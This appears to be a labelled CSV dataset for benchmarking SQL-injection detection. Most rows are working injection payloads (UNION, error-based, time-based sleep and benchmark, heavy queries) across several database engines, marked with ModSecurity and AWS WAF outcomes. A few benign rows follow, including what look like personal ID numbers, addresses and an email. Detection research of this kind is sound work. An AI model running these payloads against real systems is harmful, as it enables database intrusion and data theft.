Query,Label,ModSecurity Result Label,AWS WAF Result Label
"1""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""nkgd""  =  ""nkgd",1,1,1
"1' in boolean mode  )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,1
"1'||  (  select 'wtdz' from dual where 1866  =  1866 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,1
"1%"" and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""%""  =  """,1,1,1
"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'ozur'  =  'ozur",1,1,1
select   (  case when   (  7254  =  5901  )   then 1 else 7254*  (  select 7254 from master..sysdatabases  )   end  )  --,1,1,1
"-4550""  )   as hlwe where 6026  =  6026 or   (  9364  =  9593  )  *9593--",1,1,1
"-9408%""   )    )    union all select 1841,1841,1841,1841,1841,1841--",1,1,1
"1%""   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""%""  =  """,1,1,1
"1"" where 5927  =  5927",1,0,0
-1629'   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  'tezf'  =  'tezf,1,1,1
"1%'  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",1,1,1
"1'   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   'oucg'  =  'oucg",1,1,1
"-8046""   )    )     )   union all select 3126,3126,3126,3126,3126,3126,3126,3126,3126#",1,1,1
"1%""   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   ""%""  =  """,1,1,1
1'   )    )    as yyrx where 5600  =  5600,1,1,1
"-7725%'   )    )    union all select 4559,4559,4559,4559,4559,4559,4559,4559,4559--",1,1,1
"1   )    )    as cdhd where 2958  =  2958 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,1
"1%'  )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,1
1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'ahjf'  =  'ahjf,1,1,1
-1638' or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'xkne'  =  'xkne,1,1,1
(  case when 5640  =  5640 then 5640 else null end  ),1,1,1
"-1503"" order by 1--",1,1,1
"1""  )   and 2006  =  2006",1,1,1
1'   )    )     )   and 2542  =  7042--,1,1,1
1' OR 1=1--,1,1,1
"-7433""   )    )    as zsnt where 2513  =  2513 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",1,1,1
"-4373%""   )    )    or 5672  =  5188--",1,1,1
"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'dssx' like 'dssx",1,1,1
1' rlike sleep  (  5  )   and 'ojqz' like 'ojqz,1,1,1
1'  )   as xskm where 3525  =  3525 and 2435  =  6513,1,1,1
"1%""  )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,1
1'   )    )    as joco where 2922  =  2922,1,1,1
"1%""   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   ""%""  =  """,1,1,1
1'   )    )    as dipp where 1714  =  1714,1,1,1
end and   (  'unko'  =  'unko,1,1,1
"1""   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--",1,1,1
-5116  )   or   (  8287  =  4930  )  *4930,1,1,1
select sleep  (  5  )  # wihl,1,1,1
1'   )    )    as dipp where 1714  =  1714,1,1,1
1'  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'rjjo'  =  'rjjo,1,1,1
1'||  (  select 'bgdh' from dual where 1967  =  1967,1,1,1
"1'+  (  select 'dbvq' where 2045  =  2045 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,1,1
"-6798%""   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""%""  =  """,1,1,1
"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'sqbr'  =  'sqbr",1,1,1
1'||  (  select 'dfmw' from dual where 1723  =  1723,1,1,1
"1 where 7757  =  7757 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1,1,1
"1'   )    )     )   union all select null,null,null,null,null,null#",1,1,1
"1 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  -- cbsd",1,1,1
SELECT option_value FROM wp_options WHERE option_name  =  'zcf_crm_oldversion_shortcodes' LIMIT 1,0,1,1
SELECT option_value FROM wp_options WHERE option_name  =  'amp-options' LIMIT 1,0,1,1
-1459'   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'eiet' like 'eiet,1,1,1
1'+  (  select somn where 8636  =  8636 rlike sleep  (  5   )    )   +',1,1,1
-3846%' or 6872  =  6872 and '%'  =  ',1,1,1
"-4929"" where 6381  =  6381 or 8571  =  8571--",1,1,1
1'  )   where 1917  =  1917 union all select null#,1,1,1
"-9175'   )    )    union all select 6174,6174,6174,6174--",1,1,1
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  ""eboa"" like ""eboa",1,1,1
"1,  (  select   (  case when   (  5334  =  4976  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",1,1,1
1'   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  'qfxg'  =  'qfxg,1,1,1
"1' and elt  (  9371  =  8882,8882  )   and 'vurh'  =  'vurh",1,1,1
"1%""   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   ""%""  =  """,1,1,1
"1'+  (  select pdfv where 1172  =  1172 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   +'",1,1,1
"1'   )    )    as jntr where 5051  =  5051 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,1,1
1'   )    )    and 2006  =  2006,1,1,1
"1 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  -- ztzu",1,1,1
"SELECT option_name, option_value FROM wp_options WHERE autoload  =  'yes'",0,1,1
"-2197' union all select 8065,8065,8065,8065--",1,1,1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  ""lsvg"" like ""lsvg",1,1,1
"1   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  5340  =  5340",1,1,1
"1%"" union all select null,null,null,null--",1,1,1
"1'   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  'vjhw' like 'vjhw",1,1,1
â or 1  =  1 --,1,1,1
"1'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'hbld'  =  'hbld",1,1,1
"-3827""  )   or 8571  =  8571--",1,1,1
"1' and make_set  (  9860  =  6956,6956  )   and 'toru'  =  'toru",1,1,1
"1   )    )    as gdcg where 2329  =  2329 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1,1
"1""  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""zzkc""  =  ""zzkc",1,1,1
1%'  )   and 7533  =  7533 and   (  '%'  =  ',1,1,1
"1'  )   where 6634  =  6634 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1,1,1
"1'  )   where 7322  =  7322 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1
SELECT COUNT ( * )  FROM wp_options WHERE option_name LIKE 'wp\\_wps\\_bg\\_file\\_sync\\_1\\_batch\\_%',0,1,1
"1'  )   as idqc where 5288  =  5288 and elt  (  1210  =  1210,sleep  (  5   )    )   --",1,1,1
1   )    )     )   union all select null--,1,1,1
"-4586 union all select 2068,2068,2068,2068--",1,1,1
1   )    )    as wwys where 9248  =  9248,1,1,1
"1""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""mlld"" like ""mlld",1,1,1
"-6085 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1,1,1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""%""  =  """,1,1,1
"1%'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  '%'  =  '",1,1,1
1 OR 2%,1,1,1
"1%""   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""%""  =  """,1,1,1
"1""   )    )    union all select null,null#",1,1,1
"1""   )    )    as gprr where 5975  =  5975 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,1,1
"1""   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""ynwr"" like ""ynwr",1,1,1
1'   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'yxpi'  =  'yxpi,1,1,1
"1 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  # cgow",1,1,1
1'   )    )    as hqhs where 5383  =  5383,1,1,1
1' and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'ucpa'  =  'ucpa,1,1,1
" end and ""%""  =  """,1,1,1
"1"" or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1,1,1
1 where 4985  =  4985 order by 1#,1,1,1
-7710' where 5658  =  5658 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1,1,1
"-6363""  )   where 4043  =  4043 union all select 4043,4043,4043,4043,4043,4043,4043,4043,4043--",1,1,1
"1'   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'nlnk' like 'nlnk",1,1,1
"-2898"" where 3301  =  3301 union all select 3301,3301,3301,3301,3301,3301,3301,3301,3301,3301#",1,1,1
"-2033""  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,1,1
"1',  (  case when 2872  =  2872 then 1 else null end  )  ",1,1,1
-4215  )   where 5782  =  5782 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,1,1
1' where 1045  =  1045 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,1,1,1
"1"" where 7344  =  7344 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --",1,1,1
1'  )   as chla where 6098  =  6098,1,1,1
"1 union all select null,null,null,null,null,null,null,null#",1,1,1
1%'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  '%'  =  ',1,1,1
1'--,1,1,1
"1%""   )    )    and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,1
"1'||  (  select 'fpfl' from dual where 1434  =  1434 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   ||'",1,1,1
1   )    )     )   rlike sleep  (  5  )  #,1,1,1
"  (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1,1,1
"-1504""  )   as wpes where 6256  =  6256 union all select 6256,6256,6256,6256,6256,6256,6256,6256,6256,6256#",1,1,1
"1%"" order by 1--",1,1,1
1%'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,1,1
1  )   union all select null--,1,1,1
"1'  )   and elt  (  1210  =  1210,sleep  (  5   )    )   ",1,1,1
"1 where 6040  =  6040 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1
"-4954%""  )   or 5244  =  4832",1,1,1
"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""fkmh""  =  ""fkmh",1,1,1
-8045   )    )     )   order by 1--,1,1,1
"1'  )   where 4786  =  4786 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,1,1
b3r3al,0,0,0
1'||  (  select 'qtep' where 2572  =  2572 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,1,1
1  )   as zmxb where 8424  =  8424 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1,1,1
"1"" union all select null,null,null,null,null,null,null--",1,1,1
"1   )    )    as queb where 2449  =  2449 union all select null,null#",1,1,1
1%'  )   and 8734  =  5844,1,1,1
1'+  (  select ntym where 4750  =  4750,1,1,1
"1'   )    )    as hmyc where 6732  =  6732 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,1,1
"-9150%'   )    )     )   union all select 7057,7057,7057,7057,7057,7057,7057,7057--",1,1,1
"1""   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  ""asvy""  =  ""asvy",1,1,1
"1""  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""fpqh""  =  ""fpqh",1,1,1
"-6760 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # ikqw",1,1,1
"1',iif  (  6625  =  6625,1,1/0  )  ",1,1,1
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'jloi'  =  'jloi",1,1,1
"1""   )    )    as hace where 8785  =  8785",1,1,1
1%'  )   and 8734  =  5844,1,1,1
1 rlike sleep  (  5  ),1,1,1
"1""  )   as jmwr where 5978  =  5978 rlike   (  select   (  case when   (  1396  =  8762  )   then 1 else 0x28 end   )    )   --",1,1,1
"1%"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and ""%""  =  """,1,1,1
1'+  (  select ntym where 4750  =  4750,1,1,1
"1""   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""jgoq""  =  ""jgoq",1,1,1
"1' where 9116  =  9116 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,1
-5089'   )    )    as icbb where 1129  =  1129 or 6250  =  9650,1,1,1
"-5703'  )   or elt  (  2972  =  8708,8708  )  ",1,1,1
"-6851'  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'csfx'  =  'csfx",1,1,1
"1""  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""fpqh""  =  ""fpqh",1,1,1
1'   )    )     )   and sleep  (  5  )   and    (    (     (  'vbck' like 'vbck,1,1,1
1  )   where 2918  =  2918 and 7533  =  7533--,1,1,1
"-8609%""   )    )     )   union all select 6021,6021,6021,6021,6021,6021--",1,1,1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp",1,1,1
"1%"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and ""%""  =  """,1,1,1
"1""  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""fpqh""  =  ""fpqh",1,1,1
"1   )    )    as rwsn where 9946  =  9946 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1,1,1
"1'+  (  select wjpc where 5943  =  5943 and make_set  (  8403  =  8403,8899   )    )   +'",1,1,1
"1%'   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   '%'  =  '",1,1,0
-9456%'   )    )     )   order by 1#,1,1,1
SHOW FULL COLUMNS FROM `wp_options`,0,0,0
ejerci78,0,0,0
47209,0,0,0
"calle valencia de don juan 161, 7?d",0,0,0
b3r3al,0,0,0
46942381w,0,0,0
elder@parcalia.hn,0,0,0
24596413y,0,0,0
compte,0,0,0
2366,0,0,0
leshowit,0,0,0
SELECT * FROM wp_favethemes_currency_converter,0,0,0
45699398p,0,0,0
"calle profesor angel lacalle, s/n,",0,0,0
tardn,0,0,0
3.55E+15,0,0,0
SELECT * FROM wp_houzez_fields_builder order by id ASC,0,0,0
rigby,0,0,0
caada del hoyo,0,0,0
45641,0,0,0
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367581 ),0,0,0
